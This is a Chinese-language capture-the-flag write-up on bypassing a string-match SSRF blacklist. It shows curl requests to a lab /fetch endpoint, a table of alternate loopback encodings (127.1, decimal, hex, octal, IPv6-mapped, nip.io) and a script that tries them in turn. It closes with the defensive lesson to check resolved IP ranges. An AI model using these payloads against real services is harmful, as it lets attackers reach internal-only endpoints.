# Q37 · 综合 SSRF 黑名单绕过

- 实测靶机：`http://目标地址`
- FLAG：`TOGOGO-flag{}`

## 1. 题目要点

- `GET /fetch?url=X`：服务端去抓 X，返回前 4KB
- `GET /internal/flag`：仅 `remote_addr ∈ {127.0.0.1, ::1}` 才回 flag，否则 403
- 黑名单是**字符串**精确匹配：`{127.0.0.1, localhost, 0.0.0.0, ::1}`（带 `.lower()`）

目标：让服务端自己去访问 `/internal/flag`，让黑名单看不出我们指的是 localhost。

## 2. 三步手工复刻

### Step 1 · 确认 `/internal/flag` 直连 403

```bash
curl -i http://目标地址/internal/flag
# HTTP/1.1 403 FORBIDDEN
# {"msg":"only local access","ok":false}
```

### Step 2 · 明文 host 被黑

```bash
curl "http://目标地址/fetch?url=http://127.0.0.1/internal/flag"
# {"msg":"blocked host: 127.0.0.1","ok":false}
```

### Step 3 · 用 `127.1` 短格式绕过（一击命中）

```bash
curl "http://目标地址/fetch?url=http://127.1/internal/flag"
# <h3>HTTP 200</h3><pre>{"flag":"TOGOGO-flag{...}","ok":true}</pre>
```

原理：Python `socket` 解析 `127.1` 时按 BSD IPv4 短格式展开 → `127.0.0.1`，
但 `urlparse(...).hostname` 给出的字符串是 `"127.1"`，不在黑名单里。

## 3. 等价绕过 payload 速查

| Host 写法 | 类型 |
| --- | --- |
| `127.1` | IPv4 短格式 |
| `127.0.0.2` | loopback 段内（127/8 全是本机） |
| `2130706433` | 十进制整数 |
| `0x7f000001` | 十六进制整数 |
| `0177.0.0.1` | 八进制 |
| `[::ffff:127.0.0.1]` | IPv4-mapped IPv6 |
| `127.0.0.1.nip.io` | DNS wildcard，解析回 127.0.0.1 |

任选一个套进 `/fetch?url=http://<HOST>/internal/flag` 即可。

## 4. 一键脚本

```bash
python3 main.py                              # 默认打 目标地址
python3 main.py http://other-host:port       # 换靶机
```

输出会逐个尝试上面的 payload，并把第一个抓到的 flag 打印出来。

## 5. 一句话记忆

> SSRF 防护必须基于**解析后的 IP 段**判断，不能基于字符串匹配，
> 否则 IPv4 的十几种等价写法（短格式 / 进制 / IPv6 映射 / DNS wildcard）随便挑一种就能绕。
